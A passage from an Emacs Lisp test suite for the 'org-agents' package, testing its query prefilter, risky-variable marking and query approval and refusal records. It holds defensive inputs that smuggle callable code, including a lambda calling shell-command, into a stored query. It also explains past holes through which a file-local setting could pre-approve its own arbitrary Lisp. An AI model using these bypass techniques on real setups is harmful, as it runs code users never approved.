        (org-agents-safe-queries nil)
        (noninteractive t)
        ;; Through the reader, as an :AGENT_QUERY: property would store it.
        (payload (read (prin1-to-string (list (byte-compile (lambda () t)))))))
    (should-not (org-agents--structurally-safe-p payload))
    (should-not (org-agents--gate payload))
    ;; A lambda in the same position is just as callable.
    (should-not (org-agents--gate '((lambda () (shell-command "x")))))))

(ert-deftest org-agents-test-gate-allows-bare-special ()
  "A bare special expands to a read-only accessor, so it needs no approval."
  (let ((noninteractive t))
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate (org-agents--expand '(and (todo) $TODO))))
      (should (org-agents--gate (org-agents--expand '$TAGS)))
      (should (org-agents--gate (org-agents--expand '$ITEM))))))

(ert-deftest org-agents-test-conjuncts-property-exists ()
  (let ((org-use-property-inheritance nil))
    (should (equal (org-agents--prefilter-conjuncts
                    '(and (todo) (property "NEXT_REVIEW")))
                   '((property "NEXT_REVIEW"))))))

(ert-deftest org-agents-test-conjuncts-property-ts-implies-exists ()
  (let ((org-use-property-inheritance nil))
    (should (equal (org-agents--prefilter-conjuncts
                    '(and (todo) (property-ts "NEXT_REVIEW" :to today)))
                   '((property "NEXT_REVIEW"))))))

(ert-deftest org-agents-test-conjuncts-empty-for-residual-only ()
  (should (null (org-agents--prefilter-conjuncts '(todo))))
  (should (null (org-agents--prefilter-conjuncts '(tags "urgent"))))
  (should (null (org-agents--prefilter-conjuncts '(regexp "colou?r")))))

(ert-deftest org-agents-test-conjuncts-heading-literal-only ()
  (should (equal (org-agents--prefilter-conjuncts '(and (heading "Review") (todo)))
                 '((heading "Review"))))
  (should (equal (org-agents--prefilter-conjuncts '(heading "Review" "widget"))
                 '((heading "Review" "widget"))))
  ;; Regexp syntax is NOT what disqualifies a heading literal, because
  ;; org-ql leaves no such thing: see
  ;; `org-agents-test-heading-arguments-are-always-literals'.  Each of
  ;; these is sought as text on both sides.
  (should (equal (org-agents--prefilter-conjuncts '(heading "Rev.*iew"))
                 '((heading "Rev.*iew"))))
  (should (equal (org-agents--prefilter-conjuncts '(heading "Ship it {maybe}"))
                 '((heading "Ship it {maybe}"))))
  (should (equal (org-agents--prefilter-conjuncts '(heading "a\\b|c^d$e+f?g*h"))
                 '((heading "a\\b|c^d$e+f?g*h"))))
  ;; `]' alone is refused, and for the priority-cookie reason
  ;; `org-agents--heading-literals-p' gives rather than for any regexp
  ;; reason.  `[' on its own is fine.
  (should (null (org-agents--prefilter-conjuncts '(heading "[#A] Review"))))
  (should (null (org-agents--prefilter-conjuncts
                 '(heading "Review" "spans ] the junction"))))
  (should (equal (org-agents--prefilter-conjuncts '(heading "[#A Review"))
                 '((heading "[#A Review"))))
  ;; A non-string, and the empty argument list, push nothing.
  (should (null (org-agents--prefilter-conjuncts '(heading 5))))
  (should (null (org-agents--prefilter-conjuncts '(heading)))))

(ert-deftest org-agents-test-heading-arguments-are-always-literals ()
  "Pin org-ql's `heading' normalizer, which is what makes the guard sound.
`org-agents--heading-literals-p' refuses `]' and nothing else -- notably
not regexp syntax -- and that is only correct while org-ql keeps
`regexp-quote'ing every `heading' argument.  The day it stops, a
`heading' argument becomes a regexp whose matches org-agents cannot
enumerate from the raw line, and this test is what fails loudly instead
of an agent quietly losing files."
  (should (equal (org-ql--normalize-query '(heading "a.b" "c+d"))
                 '(heading-regexp "a\\.b" "c\\+d")))
  ;; The whole metacharacter set, in one argument, unconditionally
  ;; quoted: there is no arity or option under which `heading' takes a
  ;; regexp.
  (should (equal (org-ql--normalize-query '(heading "x*y?z[1]"))
                 (list 'heading-regexp (regexp-quote "x*y?z[1]")))))

(ert-deftest org-agents-test-conjuncts-planning-drops-every-bound ()
  "The head alone decides a planning conjunct, whatever the bounds say.
ripgrep cannot compare dates, so a bound is left residual for org-ql and
the conjunct asks only whether the stamp is there at all.  Dropping a
conjunct of org-ql's condition only widens: `there is a stamp in the
period' implies `there is a stamp'.

This is a coverage GAIN over pushing a date.  Every shape below pushes
now; `(deadline 7)' and `(deadline auto)' pushed NOTHING while a date had
to be resolved to a calendar day a second engine would read the same way,
and the two shapes org-ql and that engine read DIFFERENTLY -- a repeated
key, and `:on' beside a bound -- had to be refused outright.  With one
engine there is no second reading to disagree with."
  (dolist (case '(((scheduled) . (scheduled))
                  ((scheduled :to 7) . (scheduled))
                  ((scheduled :to today) . (scheduled))
                  ((scheduled :from "2026-01-01" :to "2026-12-31") . (scheduled))
                  ;; A date that is not a date at all, and one that names
                  ;; a day that does not exist: org-ql normalizes both and
                  ;; the pattern reads neither.
                  ((scheduled :to "2026-02-30") . (scheduled))
                  ((scheduled :before today) . (scheduled))
                  ;; The two shapes the old splitter refused.
                  ((scheduled :to today :to "2026-01-01") . (scheduled))
                  ((closed :on today :from 1 :to 7) . (closed))
                  ((deadline) . (deadline))
                  ((deadline 7) . (deadline))
                  ((deadline auto) . (deadline))
                  ((closed :on "2026-08-01") . (closed))))
    (should (equal (org-agents--prefilter-conjuncts (car case))
                   (list (cdr case)))))
  ;; And it is still a conjunct among others, in query order.
  (should (equal (org-agents--prefilter-conjuncts
                  '(and (property "URL") (scheduled :to 7) (todo)))
                 '((property "URL") (scheduled)))))

(ert-deftest org-agents-test-conjuncts-property-equality-respects-inheritance ()
  (let ((org-use-property-inheritance '("OVERLAY")))
    ;; A name that cannot inherit pushes as before.
    (should (equal (org-agents--prefilter-conjuncts '(property "STYLE" "habit"))
                   '((property "STYLE" "habit"))))
    (should (equal (org-agents--prefilter-conjuncts '(property "STYLE"))
                   '((property "STYLE"))))
    ;; An inheriting name pushes nothing, not even existence: the value
    ;; may come from a file-level #+PROPERTY: line or from
    ;; `org-global-properties', neither of which is a `:NAME:' line in
    ;; the matching file, so the file would be dropped from the
    ;; candidates.
    (should (null (org-agents--prefilter-conjuncts '(property "OVERLAY" "x"))))
    (should (null (org-agents--prefilter-conjuncts '(property "OVERLAY"))))
    (should (null (org-agents--prefilter-conjuncts
                   '(property-ts "OVERLAY" :to today))))
    (let ((org-use-property-inheritance t))
      (should (null (org-agents--prefilter-conjuncts '(property "STYLE" "habit"))))
      (should (null (org-agents--prefilter-conjuncts
                     '(property-ts "STYLE" :to today)))))))

(ert-deftest org-agents-test-conjuncts-nested-queries-residual ()
  (should (null (org-agents--prefilter-conjuncts '(parent (property "X")))))
  (should (null (org-agents--prefilter-conjuncts '(descendants (todo))))))

(ert-deftest org-agents-test-conjuncts-several-in-query-order ()
  (should (equal (org-agents--prefilter-conjuncts
                  '(and (property "URL") (heading "Review") (closed :on today)
                        (todo)))
                 '((property "URL") (heading "Review") (closed)))))

(ert-deftest org-agents-test-conjuncts-carry-no-ts-structs ()
  "The analysis reads the PRE-normalization sexp, and says so structurally.
org-ql's normalizer rewrites a relative bound into a `ts' struct; a
conjunct list holding one would mean the splitter had been handed
normalized input, and the emitter would then be quoting a struct into a
pattern."
  (let ((conjuncts (org-agents--prefilter-conjuncts
                    '(and (scheduled :to 7) (property "X")))))
    (should conjuncts)
    (should (equal conjuncts '((scheduled) (property "X"))))
    (dolist (conjunct conjuncts)
      (dolist (element conjunct)
        (should (or (symbolp element) (stringp element)))))))

(ert-deftest org-agents-test-conjuncts-special-properties-residual ()
  "A special property is entry structure, not a drawer line, so it never pushes.
`org-entry-get' answers CATEGORY, ITEM, DEADLINE and the rest from the
entry or its file, and no drawer anywhere holds a line for one -- so a
pushed pattern would return NO files for a query that matches thousands."
  (should (null (org-agents--prefilter-conjuncts '(property "CATEGORY" "work"))))
  (should (null (org-agents--prefilter-conjuncts '(property "ITEM"))))
  (should (null (org-agents--prefilter-conjuncts '(property "TODO"))))
  (should (null (org-agents--prefilter-conjuncts '(property "DEADLINE"))))
  (should (null (org-agents--prefilter-conjuncts
                 '(property-ts "DEADLINE" :to today))))
  ;; An ordinary name in the same position still pushes.
  (should (equal (org-agents--prefilter-conjuncts
                  '(property-ts "NEXT_REVIEW" :to today))
                 '((property "NEXT_REVIEW")))))

;;;; Options

(defconst org-agents-test--defcustoms
  '(org-agents-safe-queries
    org-agents-refused-queries
    org-agents-refused-heads
    org-agents-prefilter
    org-agents-rg-executable
    ;; The bound on how long the prefilter may block Emacs.  A file-local
    ;; nil takes the bound off entirely, which is the unbounded
    ;; `call-process' block this option was added to remove; a file-local
    ;; 0 expires every run, which sends every corpus-scope agent down the
    ;; live whole-corpus walk.  Neither is a decision a file gets to make
    ;; silently.
    org-agents-rg-timeout
    org-agents-exclude
    org-agents-files
    org-agents-attributes-file
    ;; The bound on how many entries one `org-agents-apply-actions' may
    ;; edit, which is the only thing that bounds an action's blast
    ;; radius: a file that could raise it could have the command edit
    ;; the whole corpus.
    org-agents-action-limit
    ;; `define-globalized-minor-mode' generates a `defcustom' too, and it
    ;; lands in this group like any other.  One per globalized mode.
    global-org-agents-mode
    global-org-agents-faces-mode)
  "Every `org-agents' user option, written out here on purpose.
This test owns the list.  A `defcustom' added to the package and not to
this list fails the completeness half of
`org-agents-test-every-defcustom-is-risky', which is what keeps a new
option from arriving unmarked.")

(defconst org-agents-test--risky-variables
  (cons 'org-agents--session-approved org-agents-test--defcustoms)
  "Every variable that must be `risky-local-variable'.
The options, plus the one internal variable a file-local setting could
subvert the gate through: `org-agents--session-approved' IS the approval
record the gate consults first, and it is a `defvar', which takes no
`:risky t' and so has to be marked by hand.  Emacs classes an unmarked
variable `unsafe' rather than `risky', and `unsafe' is exactly the class
it offers to mark permanently safe -- so a file could install a table
holding the hash of its own arbitrary Lisp, computable offline from the
published default of `org-agents-exclude', and be asked about nothing
afterwards.")

(defconst org-agents-test--auto-risky-options
  '(org-agents-mode-hook global-org-agents-mode-hook
    org-agents-faces-mode-hook global-org-agents-faces-mode-hook)
  "The package's options that Emacs classes risky by NAME.
`define-minor-mode' and `define-globalized-minor-mode' generate a hook
option each, and `risky-local-variable-p' answers t for any name ending
in `-hook' whether or not the property is set -- so these carry no
`:risky t' and need none.  They are named here so that the completeness
check can account for every option the package defines, and still hold
the ones it writes by hand to the property itself.")

(ert-deftest org-agents-test-every-defcustom-is-risky ()
  "Every option is `:risky t', and every option is on the owned list.
Each of these names either Lisp to evaluate, a program to run, which
files get opened and written, how long Emacs may be blocked waiting for
that program, or the record of what has already been
approved -- so a file-local setting of any of them must not be applied
without a decision, and must never be offered permanent or
directory-wide trust.  Two halves, because either alone is passable: the
first says the listed variables are marked, the second says the list is
the whole set.

The set is derived by NAME and not from the group: a `defcustom' declared
under some other `:group' is still an `org-agents' option a file-local
block can reach, and deriving from `(get 'org-agents 'custom-group)' let
exactly that case through unmarked."
  (dolist (var org-agents-test--risky-variables)
    (should (get var 'risky-local-variable)))
  ;; The generated hooks carry no property and need none, but only for as
  ;; long as Emacs really does class a `-hook' name risky by itself.
  (dolist (var org-agents-test--auto-risky-options)
    (should (risky-local-variable-p var)))
  (let (declared)
    ;; `define-globalized-minor-mode' names its option `global-' first, so
    ;; the prefix has to allow for that one and for nothing looser.
    (mapatoms (lambda (symbol)
                (when (and (string-match-p "\\`\\(global-\\)?org-agents-"
                                           (symbol-name symbol))
                           (custom-variable-p symbol))
                  (push symbol declared))))
    (should declared)
    (should (equal (sort (mapcar #'symbol-name declared) #'string<)
                   (sort (mapcar #'symbol-name
                                 (append org-agents-test--defcustoms
                                         org-agents-test--auto-risky-options))
                         #'string<))))
  ;; And the group still accounts for all of them, which is what keeps an
  ;; option from going missing out of customize's own tree.
  (let ((grouped (cl-loop for (symbol type) in (get 'org-agents 'custom-group)
                          when (eq type 'custom-variable) collect symbol)))
    (should (equal (sort (mapcar #'symbol-name grouped) #'string<)
                   (sort (mapcar #'symbol-name
                                 (copy-sequence org-agents-test--defcustoms))
                         #'string<)))))

(ert-deftest org-agents-test-no-option-is-offered-permanent-trust ()
  "Emacs must sort every one of these into `risky', never into `unsafe'.
The distinction is the whole point of the marking, and it is invisible to
the `risky-local-variable' property alone: `hack-local-variables-filter'
sorts a file-local setting into one bucket or the other, and files.el
offers the `!' \"permanently mark these values as safe\" option for the
UNSAFE ones only.  `org-agents--session-approved' landed in `unsafe', so
a file carrying a session table that pre-approved its own arbitrary Lisp
was offered exactly that permanent trust."
  (let ((enable-local-variables t)
        unsafe risky)
    (cl-letf (((symbol-function 'hack-local-variables-confirm)
               (lambda (_all unsafe-vars risky-vars _dir)
                 (setq unsafe unsafe-vars risky risky-vars)
                 nil)))
      (with-temp-buffer
        (hack-local-variables-filter
         (mapcar (lambda (var) (cons var nil))
                 org-agents-test--risky-variables)
         nil)))
    (should-not unsafe)
    (should (equal (sort (mapcar #'symbol-name org-agents-test--risky-variables)
                         #'string<)
                   (sort (mapcar (lambda (cell) (symbol-name (car cell))) risky)
                         #'string<)))))

;;;; Approvals

(defconst org-agents-test--approval-vars
  '(org-agents-safe-queries org-agents-refused-queries)
  "The two variables the approval records live in.")

(defconst org-agents-test--customize-properties
  '(saved-value saved-variable-comment theme-value variable-comment force-value)
  "The symbol properties `customize-save-variable' writes.
They live on the symbol, not in any binding, so `let' does not contain
them -- and `custom-save-all' writes out EVERY variable carrying a
`saved-value', not merely the one just saved.  Left behind, one test's
saved value is written into the next test's `custom-file', where an
assertion about what that file does not contain finds it there.")

(defun org-agents-test--approval-properties ()
  "The current `org-agents-test--customize-properties', to be put back."
  (cl-loop for var in org-agents-test--approval-vars
           collect (cons var
                         (cl-loop for prop in org-agents-test--customize-properties
                                  collect (cons prop (get var prop))))))

(defun org-agents-test--restore-approval-properties (saved)
  "Put back what `org-agents-test--approval-properties' collected as SAVED."
  (pcase-dolist (`(,var . ,props) saved)
    (pcase-dolist (`(,prop . ,value) props)
      (if value (put var prop value) (cl-remprop var prop)))))

(defmacro org-agents-test--with-custom-file (&rest body)
  "Run BODY with a temp `custom-file' and empty approval lists.
`customize-save-variable' writes nothing unless `custom-file' AND
`user-init-file' are both set: it calls `(custom-file t)', which answers
nil whenever `user-init-file' is nil, and then merely `set's the variable
after saying so in a message.  Batch implies `-q', so both have to be
bound here or every persistence assertion in this section would be
vacuously true.  `file' is bound to the temp file.

The customize properties are put back afterwards, for the reason
`org-agents-test--customize-properties' gives."
  (declare (indent 0))
  `(let* ((file (make-temp-file "org-agents-custom" nil ".el"
                               ";;; -*- lexical-binding: t -*-\n"))
          (custom-file file)
          (user-init-file file)
          (org-agents-safe-queries nil)
          (org-agents-refused-queries nil)
          (org-agents--session-approved (make-hash-table :test 'equal))
          (properties (org-agents-test--approval-properties)))
     (unwind-protect (progn ,@body)
       (org-agents-test--restore-approval-properties properties)
       (delete-file file))))

(defconst org-agents-test--residual-query
  '(and (todo) (string-match "distinctive-leaf" (or (org-entry-get nil "URL") "")))
  "A query the gate has to ask about, carrying a leaf worth grepping for.")

(ert-deftest org-agents-test-approval-stores-the-query-text ()
  "An approval records the query beside its hash, and is persisted.
A list of bare hashes can be neither read nor revoked: nothing in it says
what was approved."
  (org-agents-test--with-custom-file
    (let ((noninteractive nil)
          (form (org-agents--effective-query org-agents-test--residual-query)))
      (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (should (org-agents--gate form)))
      (should (= 1 (length org-agents-safe-queries)))
      (let ((entry (car org-agents-safe-queries)))
        (should (consp entry))
        (should (equal (car entry) (org-agents--query-hash form)))
        (should (equal (cdr entry) (org-agents--query-text form)))
        (should (string-match-p "distinctive-leaf" (cdr entry))))
      ;; And it really was written, not merely set for this session.
      (let ((text (org-agents-test--file-text file)))
        (should (string-match-p "org-agents-safe-queries" text))
        (should (string-match-p "distinctive-leaf" text))))))

(ert-deftest org-agents-test-approval-does-not-promise-what-it-cannot-save ()
  "The gate offers to remember only where customize has a file to write.
The guard was `(or custom-file user-init-file)', which is not the
condition `customize-save-variable' uses: with `custom-file' set and
`user-init-file' nil the user was asked \"Remember this approval
permanently?\", answered yes, and nothing was written."
  (let* ((file (make-temp-file "org-agents-custom" nil ".el"))
         (custom-file file)
         (user-init-file nil)
         (org-agents-safe-queries nil)
         (org-agents--session-approved (make-hash-table :test 'equal))
         (noninteractive nil)
         (prompts nil)
         (form (org-agents--effective-query org-agents-test--residual-query)))
    (unwind-protect
        (progn
          (cl-letf (((symbol-function 'yes-or-no-p)
                     (lambda (p &rest _) (push p prompts) t)))
            (should (org-agents--gate form)))
          (should (cl-some (lambda (p) (string-match-p "run it" p)) prompts))
          (should-not (cl-some (lambda (p) (string-match-p "Remember" p)) prompts))
          (should (equal "" (org-agents-test--file-text file))))
      (delete-file file))))

(ert-deftest org-agents-test-approval-honours-legacy-and-new-entries ()
  "A stored list may hold bare hashes and hash-with-text conses alike.
`member' answered for a list of bare strings only, so once the gate began
writing conses it would have stopped honouring what it had just written."
  (let* ((legacy '(and (todo) (ignore)))
         (recent '(and (todo) (ignore) (ignore)))
         (org-agents-safe-queries
          (list (org-agents--query-hash legacy)
                (cons (org-agents--query-hash recent)
                      (org-agents--query-text recent))))
         (org-agents-refused-queries nil)
         (org-agents--session-approved (make-hash-table :test 'equal))
         (noninteractive t))
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate legacy))
      (should (org-agents--gate recent)))))

(defmacro org-agents-test--with-approvals-buffer (&rest body)
  "Run BODY in the buffer `org-agents-list-approvals' pops up, then kill it."
  (declare (indent 0))
  `(unwind-protect
       (progn (save-window-excursion (org-agents-list-approvals))
              (with-current-buffer "*org-agents approvals*" ,@body))
     (when-let* ((buffer (get-buffer "*org-agents approvals*")))
       (kill-buffer buffer))))

(ert-deftest org-agents-test-list-approvals-shows-the-query ()
  "The listing shows what each remembered decision covers."
  (org-agents-test--with-custom-file
    (let* ((approved '(and (todo) (ignore)))
           (refused '(and (todo) (ignore) (ignore)))
           (org-agents-safe-queries
            (list (cons (org-agents--query-hash approved)
                        (org-agents--query-text approved))
                  "0123456789abcdef0123456789abcdef01234567"))
           (org-agents-refused-queries
            (list (cons (org-agents--query-hash refused)
                        (org-agents--query-text refused)))))
      (org-agents-test--with-approvals-buffer
        (let ((text (buffer-substring-no-properties (point-min) (point-max))))
          (should (string-match-p (regexp-quote (org-agents--query-text approved))
                                  text))
          (should (string-match-p (regexp-quote (org-agents--query-text refused))
                                  text))
          ;; A legacy entry is listed AS legacy: an empty cell would leave
          ;; the reader unable to tell it from a query with no text.
          (should (string-match-p "legacy" text))
          (should (string-match-p "not recorded" text))
          (should (string-match-p "refused" text)))))))

(ert-deftest org-agents-test-revoke-approval-at-point ()
  "Revoking an approval removes it from the file AND from this session.
Without the session `remhash' a revoked approval goes on working until
Emacs is restarted, which is not what revoking means."
  (org-agents-test--with-custom-file
    (let* ((form '(and (todo) (ignore)))
           (hash (org-agents--query-hash form))
           (noninteractive t))
      (org-agents--persist-approvals
       'org-agents-safe-queries
       (list (cons hash (org-agents--query-text form))))
      (puthash hash t org-agents--session-approved)
      (should (string-match-p hash (org-agents-test--file-text file)))
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (should (equal (cons 'org-agents-safe-queries hash)
                       (tabulated-list-get-id)))
        (org-agents-approvals-revoke))
      (should (null org-agents-safe-queries))
      (should-not (gethash hash org-agents--session-approved))
      (should-not (string-match-p hash (org-agents-test--file-text file)))
      ;; And the gate asks again: in batch that means it skips.
      (should-not (org-agents--gate form)))))

(ert-deftest org-agents-test-refuse-beats-a-remembered-approval ()
  "A refusal outranks every approval, and the master switch as well."
  (let* ((form '(and (todo) (ignore)))
         (hash (org-agents--query-hash form))
         (org-agents-safe-queries (list (cons hash (org-agents--query-text form))))
         (org-agents-refused-queries
          (list (cons hash (org-agents--query-text form))))
         (org-agents--session-approved (make-hash-table :test 'equal))
         (noninteractive t))
    (puthash hash t org-agents--session-approved)
    (let ((err (should-error (org-agents--gate form) :type 'user-error)))
      (should (string-match-p "refused" (error-message-string err))))
    (let ((org-ql-ask-unsafe-queries nil))
      (should-error (org-agents--gate form) :type 'user-error))))

(ert-deftest org-agents-test-refuse-at-point-moves-the-entry ()
  "Refusing an approved query revokes it and records the refusal."
  (org-agents-test--with-custom-file
    (let* ((form '(and (todo) (ignore)))
           (hash (org-agents--query-hash form))
           (noninteractive t))
      (org-agents--persist-approvals
       'org-agents-safe-queries
       (list (cons hash (org-agents--query-text form))))
      (puthash hash t org-agents--session-approved)
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (org-agents-approvals-refuse))
      (should (null org-agents-safe-queries))
      (should-not (gethash hash org-agents--session-approved))
      (should (equal hash (org-agents--approval-hash
                           (car org-agents-refused-queries))))
      (should-error (org-agents--gate form) :type 'user-error)
      ;; And un-refusing puts it back to needing approval, not to approved.
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (org-agents-approvals-unrefuse))
      (should (null org-agents-refused-queries))
      (should-not (org-agents--gate form)))))

(ert-deftest org-agents-test-refusal-survives-a-restart ()
  "A refusal is written where startup will read it back.
Tested the only way batch can: run the refusal, then reload the file
`custom-file' names, which is exactly what startup does with it.

The reload cannot be contained by `let'.  `custom-set-variables' assigns
through `custom-set-default', which calls `set-default-toplevel-value' --
by design, so a `custom-file' read while something has a variable
`let'-bound still changes what that variable will be afterwards.  So the
top-level value is cleared, the file is loaded, and the top-level value is
put back by hand."
  (org-agents-test--with-custom-file
    (let* ((form '(and (todo) (ignore)))
           (hash (org-agents--query-hash form))
           (noninteractive t)
           (outer (default-toplevel-value 'org-agents-refused-queries)))
      (org-agents--persist-approvals
       'org-agents-safe-queries
       (list (cons hash (org-agents--query-text form))))
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (org-agents-approvals-refuse))
      (should org-agents-refused-queries)
      (unwind-protect
          (progn
            (set-default-toplevel-value 'org-agents-refused-queries nil)
            (load file nil t)
            (let ((restored (default-toplevel-value 'org-agents-refused-queries)))
              (should (equal hash (org-agents--approval-hash (car restored))))
              (should (equal (org-agents--query-text form)
                             (org-agents--approval-text (car restored))))))
        (set-default-toplevel-value 'org-agents-refused-queries outer)))))

(ert-deftest org-agents-test-refusal-survives-an-exclude-change ()
  "Editing `org-agents-exclude' must not lift a refusal.
An approval names the whole form, so changing the exclusion invalidates
one -- which is the fail-safe direction: it asks again.  Keying a REFUSAL
the same way failed OPEN.  Every refusal the user had ever made stopped
matching the moment the exclusion was edited, with no query touched at
all, and where `org-ql-ask-unsafe-queries' is nil the refused form then
ran with no prompt.  So a refusal records the query inside the form as
well, and the gate looks both up."
  (org-agents-test--with-custom-file
    (let* ((query '(and (todo) (ignore)))
           (org-agents-exclude '(not (property "AGENT_MATCH")))
           (form (org-agents--effective-query query))
           (hash (org-agents--query-hash form))
           (noninteractive t))
      (org-agents--persist-approvals
       'org-agents-safe-queries
       (list (cons hash (org-agents--query-text form))))
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (org-agents-approvals-refuse))
      (should-error (org-agents--gate form) :type 'user-error)
      ;; Both directions of an edit: a different exclusion, and none --
      ;; the latter being what the option's own docstring recommends for
      ;; matching aliases like any other entry.
      (dolist (exclude '((not (property "AGENT_MATCH") (todo)) nil))
        (let* ((org-agents-exclude exclude)
               (changed (org-agents--effective-query query)))
          ;; The whole form's own hash is gone from the record: what
          ;; refuses it now is the lookup of the query inside it.
          (should-not (equal changed form))
          (unless (equal changed query)
            (should-not (org-agents--approval-entry
                         (org-agents--query-hash changed)
                         org-agents-refused-queries)))
          (let ((err (should-error (org-agents--gate changed) :type 'user-error)))
            (should (string-match-p "refused" (error-message-string err))))
          (let ((org-ql-ask-unsafe-queries nil))
            (should-error (org-agents--gate changed) :type 'user-error)))))))

(ert-deftest org-agents-test-session-approvals-are-listed-and-revocable ()
  "A session-only approval is a row like any other, and `d' removes it.
The listing read the two persistent records only, so on a setup where
customize has no file to write -- the setup `org-agents-safe-queries'
documents, and where EVERY approval is session-only -- it said \"nothing
is remembered\" while the query went on running unprompted until Emacs was
restarted, with no way back."
  (let* ((custom-file nil)
         (user-init-file nil)
         (org-agents-safe-queries nil)
         (org-agents-refused-queries nil)
         (org-agents--session-approved (make-hash-table :test 'equal))
         (org-ql-ask-unsafe-queries t)
         (noninteractive nil)
         (form '(and (todo) (ignore)))
         (hash (org-agents--query-hash form)))
    (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
      (should (org-agents--gate form)))
    ;; Approved for the session, and saved nowhere: this is the state the
    ;; listing used to be blind to.
    (should (gethash hash org-agents--session-approved))
    (should (null org-agents-safe-queries))
    (org-agents-test--with-approvals-buffer
      (let ((text (buffer-substring-no-properties (point-min) (point-max))))
        (should (string-match-p "session" text))
        (should (string-match-p (regexp-quote (org-agents--query-text form))
                                text)))
      (goto-char (point-min))
      (should (equal (cons 'org-agents--session-approved hash)
                     (tabulated-list-get-id)))
      (org-agents-approvals-revoke))
    (should-not (gethash hash org-agents--session-approved))
    ;; And the gate asks again rather than remembering: in batch, skips.
    (let ((noninteractive t))
      (should-not (org-agents--gate form)))))

(ert-deftest org-agents-test-session-approval-can-be-refused ()
  "`r' on a session row records the refusal, text and all.
A session approval the user regrets is exactly the one they may want
refused outright, and the row has to carry enough to record it with."
  (org-agents-test--with-custom-file
    (let* ((form '(and (todo) (ignore)))
           (hash (org-agents--query-hash form))
           (noninteractive t))
      (puthash hash (org-agents--query-text form) org-agents--session-approved)
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (should (equal (cons 'org-agents--session-approved hash)
                       (tabulated-list-get-id)))
        (org-agents-approvals-refuse))
      (should-not (gethash hash org-agents--session-approved))
      (should (equal (org-agents--query-text form)
                     (org-agents--approval-text
                      (org-agents--approval-entry
                       hash org-agents-refused-queries))))
      (should-error (org-agents--gate form) :type 'user-error))))

(ert-deftest org-agents-test-approvals-commands-refuse-the-wrong-row-kind ()
  "Each listing key refuses a row of the kind it is not for.
Without these guards `d' -- documented as forgetting an APPROVAL -- would
delete a refusal from the record and from `custom-file', dropping the one
decision no approval is allowed to override, and the suite noticed
nothing: no test ever put point on a row of the wrong kind."
  (org-agents-test--with-custom-file
    (let* ((approved '(and (todo) (ignore)))
           (refused '(and (todo) (ignore) (ignore)))
           (approved-hash (org-agents--query-hash approved))
           (refused-hash (org-agents--query-hash refused))
           (noninteractive t))
      (org-agents--persist-approvals
       'org-agents-safe-queries
       (list (cons approved-hash (org-agents--query-text approved))))
      (org-agents--persist-approvals
       'org-agents-refused-queries
       (list (cons refused-hash (org-agents--query-text refused))))
      (org-agents-test--with-approvals-buffer
        ;; Approvals sort first, so point-min is the approval row and the
        ;; refusal is the one below it.
        (goto-char (point-min))
        (should (equal (cons 'org-agents-safe-queries approved-hash)
                       (tabulated-list-get-id)))
        (let ((err (should-error (org-agents-approvals-unrefuse)
                                 :type 'user-error)))
          (should (string-match-p "approval" (error-message-string err))))
        (forward-line 1)
        (should (equal (cons 'org-agents-refused-queries refused-hash)
                       (tabulated-list-get-id)))
        (let ((err (should-error (org-agents-approvals-revoke) :type 'user-error)))
          (should (string-match-p "refusal" (error-message-string err))))
        (let ((err (should-error (org-agents-approvals-refuse) :type 'user-error)))
          (should (string-match-p "already a refusal"
                                  (error-message-string err)))))
      ;; Nothing was removed by any of the three.
      (should (equal (list approved-hash)
                     (mapcar #'org-agents--approval-hash
                             org-agents-safe-queries)))
      (should (equal (list refused-hash)
                     (mapcar #'org-agents--approval-hash
                             org-agents-refused-queries)))
      (should-error (org-agents--gate refused) :type 'user-error))))

(ert-deftest org-agents-test-approvals-keys-reach-their-commands ()
  "The keys the mode and README document are the keys that are bound.
Every other listing test calls the commands as functions, so a keymap
with the wrong keys in it -- or none -- left the suite green while the
only user-facing route to revoking an approval had gone."
  (dolist (binding '(("d" . org-agents-approvals-revoke)
                     ("r" . org-agents-approvals-refuse)
                     ("u" . org-agents-approvals-unrefuse)))
    (should (eq (cdr binding)
                (keymap-lookup org-agents-approvals-mode-map (car binding)))))
  ;; And resolved through the listing buffer's own active map, which is
  ;; what says the map above is the one the listing installs -- a keymap
  ;; bound correctly and never made local would pass the check above.
  (org-agents-test--with-custom-file
    (let* ((form '(and (todo) (ignore)))
           (hash (org-agents--query-hash form)))
      (puthash hash (org-agents--query-text form) org-agents--session-approved)
      (org-agents-test--with-approvals-buffer
        (goto-char (point-min))
        (call-interactively (keymap-lookup (current-local-map) "d")))
      (should-not (gethash hash org-agents--session-approved)))))

(ert-deftest org-agents-test-persist-approvals-says-what-it-could-do ()
  "With no file to write, the change is made and described as temporary.
This branch was reached by no test at all: an outright `error' planted in
it left the suite green, and so would dropping its assignment -- which
would leave the user told a revocation had happened while the revoked
approval went on admitting its query."
  (let* ((custom-file nil)
         (user-init-file nil)
         (org-agents-safe-queries '(("hash" . "(and (todo) (ignore))")))
         (texts (org-agents-test--messages
                  (org-agents--persist-approvals 'org-agents-safe-queries nil))))
    (should (null org-agents-safe-queries))
    (should (cl-find-if (lambda (text)
                          (string-match-p "this session only" text))
                        texts))))

;;;; Registry

;; The registry is pure data, and every test here proves that twice over:
;; nothing below writes a registry the reader then evaluates, and every
;; fixture is a temporary file, so no test can reach -- or create -- the
;; developer's own `org-agents-attributes-file'.

(defconst org-agents-test--registry-example "\
#+TITLE: Attribute registry
#+STARTUP: showeverything

* OPEN
:PROPERTIES:
:ATTR_TYPE:    boolean
:ATTR_DEFAULT: false
:END:
Whether this item is still open for comment.

Read by the weekly review agent, and by nothing else.

* REVIEWS
:PROPERTIES:
:ATTR_TYPE:    number
:ATTR_DEFAULT: 0
:END:
How many times this entry has been through review.

* STATUS
:PROPERTIES:
:ATTR_TYPE:    set
:ATTR_VALUES:  open wip blocked done
:ATTR_DEFAULT: open
:ATTR_FACES:   blocked org-warning | done org-done
:END:
Where the item stands.  A set rather than a string: an item may be
blocked and waiting on review at once.
")

